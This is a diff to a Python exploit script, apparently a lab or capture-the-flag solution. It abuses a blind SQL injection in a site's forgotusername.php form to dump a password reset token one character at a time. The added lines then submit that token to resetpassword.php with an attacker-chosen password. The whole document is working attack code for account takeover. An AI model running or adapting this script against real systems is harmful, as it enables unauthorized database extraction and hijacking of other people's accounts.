@@ -7,13 +7,14 @@
 import requests
 import sys
 
-if len(sys.argv) != 4:
-	print('usage: %s TARGET USERNAME UID' % sys.argv[0])
+if len(sys.argv) != 5:
+	print('usage: %s TARGET USERNAME UID NEWPASSWORD' % sys.argv[0])
 	sys.exit(-1)
 
 target   = sys.argv[1]
 username = sys.argv[2]
 uid      = sys.argv[3]
+new_pass = sys.argv[4]
 
 def request_reset(username):
 	d = {'username':username}
@@ -24,6 +25,15 @@ def oracle(q_left, q_op, q_right):
 	d = {'username':'admin\' and %s%s%s' % (q_left, q_op, q_right)}
 	r = requests.post('http://%s/forgotusername.php'%target, data=d)
 	return 'User exists!' in r.text
+
+def change_password(token):
+	d = {
+		'token':token,
+		'password1':new_pass,
+		'password2':new_pass
+	}
+	r = requests.post('http://%s/resetpassword.php'%target,data=d)
+	return 'Password changed!' in r.text
 
 if oracle(1,'=',"\'1") != True or\
    oracle(0,'=',"\'1") != False:
@@ -57,4 +67,10 @@ for i in range(1,33):
 		else:
 			dumped += chr(mid)
 			Found = True
-print("[+] Token dumped: %s" % dumped)
+print("[+] Token dumped.")
+
+if change_password(dumped):
+	print('[+] Changed password!')
+else:
+	print('[-] Failed at changing password.')
+	sys.exit(-1)
